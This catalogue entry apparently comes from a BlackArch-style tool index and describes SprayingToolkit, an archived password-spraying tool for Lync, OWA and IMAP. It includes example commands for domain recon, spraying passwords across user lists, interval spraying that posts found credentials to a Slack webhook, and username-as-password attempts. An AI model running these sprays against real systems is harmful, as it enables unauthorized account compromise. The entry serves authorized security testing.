---
name: "sprayingtoolkit"
categories:
  - blackarch-webapp
version: "60.82e2ec8"
homepage: "https://github.com/byt3bl33d3r/SprayingToolkit"
packaged-by: [blackarch]
blackarch-builddate: "2026-01-13"
build-system: scripts
license: GPL-3.0-only
meta-checked: "2026-11-09"
github-repo: "byt3bl33d3r/SprayingToolkit"
github-stars: 1577
github-pushed: "2022-10-17"
github-archived: true
github-issues: 22
github-match: "exact"
gh-checked: "2026-11-07"
worth: 0.6
worth-basis: "historical (archived/gone upstream)"
worth-checked: "2026-11-09"
github-commits-year: 0
gh-activity-checked: "2026-11-09"
---

# sprayingtoolkit

> Fast password spraying and recon against Lync/Skype for Business, OWA, and IMAP (byt3bl33d3r).

## What it's for

SprayingToolkit makes password spraying attacks against Microsoft Lync/Skype for Business
and Outlook Web Access (OWA) — and IMAP — quicker and less painful. Its main component,
atomizer, is an asyncio-based sprayer that takes a username list plus one password, a
password list on an interval, a CSV of credentials, or usernames-as-passwords. It also
includes a recon mode that collects target information (including the Active Directory
domain name needed to attempt authentication) without spraying. The project is archived
and no longer maintained; its successors are TREVORspray and CredMaster. Only use against
systems you are authorized to test.

## Typical use cases

### Discover the domain name before spraying

Collect information about an OWA endpoint, including the internal domain name, without sending any authentication attempts.

```
sprayingtoolkit-atomizer owa 198.51.100.10 --recon
```

Outcome: prints recon results for the target — the discovered domain name is what you need before bruteforcing/spraying authentication; `--recon` never attempts a login. The same form works with `lync` and `imap` targets (URLs are accepted too).

### Spray one password against a user list

Try a single candidate password across a list of email addresses.

```
sprayingtoolkit-atomizer owa https://owa.example.com 'Password1' emails.txt
```

Outcome: attempts the password for every user in `emails.txt` concurrently (default 3 threads, `-t` to change) and reports any valid credentials. Swap `owa` for `lync` to hit Lync/Skype for Business instead.

### Spray a password list on an interval with notifications

Spread the spray over time and get alerted on hits.

```
sprayingtoolkit-atomizer owa example.com passwords.txt emails.txt -i 0:45:00 --slack https://hooks.slack.com/services/T000/B000/XXXX
```

Outcome: iterates the password file, waiting the given `H:M:S` interval between rounds, and posts successful credentials to the configured Slack (or Google Chat, `--gchat`) webhook as they are found.

### Try usernames as passwords

Test each account with its own username as the password.

```
sprayingtoolkit-atomizer lync example.com --user-as-pass usernames.txt
```

Outcome: for every user in the file, one authentication attempt using the username itself as password; hits are reported inline.

Corpus evidence (recon usage) plus upstream README; verify scope and authorization before spraying.
